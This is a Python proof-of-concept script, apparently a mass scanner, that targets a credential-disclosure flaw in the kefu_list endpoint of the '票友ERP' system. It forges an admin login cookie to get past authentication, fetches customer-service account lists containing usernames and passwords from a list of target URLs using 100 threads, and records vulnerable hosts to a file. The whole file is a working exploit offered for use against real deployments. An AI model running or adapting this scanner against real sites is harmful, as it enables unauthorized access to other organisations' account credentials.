import argparse,sys,requests
from multiprocessing.dummy import Pool # 多线程的库
import urllib3
import warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main():
    pares=argparse.ArgumentParser(description="票友ERP系统kefu_list存在信息泄露")
    pares.add_argument('-u','--url',dest='url',type=str,help='please input your link')
    pares.add_argument('-f','--file',dest='file',type=str,help='please input your file')
    args=pares.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usage python {sys.argv[0]} -h")





def poc(target):
    link="/json_db/kefu_list.aspx?stype=0&_search=false&nd=1751246532981&rows=25&page=1&sidx=id&sord=asc"
    headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3029.68 Safari/537.36",
        "Cookie": "pyerpcookie=loginname=admin"
    }
    try:
        res1=requests.get(url=target,headers=headers,timeout=5,verify=False)
        if res1.status_code == 200:
            res2=requests.get(url=target+link,headers=headers,timeout=5,verify=False)
            if "username" and "password" in res2.text:
                print(f"[+]网站{target}存在信息泄露")
                with open('output1.txt','a',encoding='utf-8')as fp:
                    fp.write(f"[+]网站{target}存在信息泄露"+'\n')
            else:
                print(f"[-]网站{target}不存在信息泄露")
    except:
        print(f"[*]存在错误，请手工测试")

if __name__ == "__main__":
    main()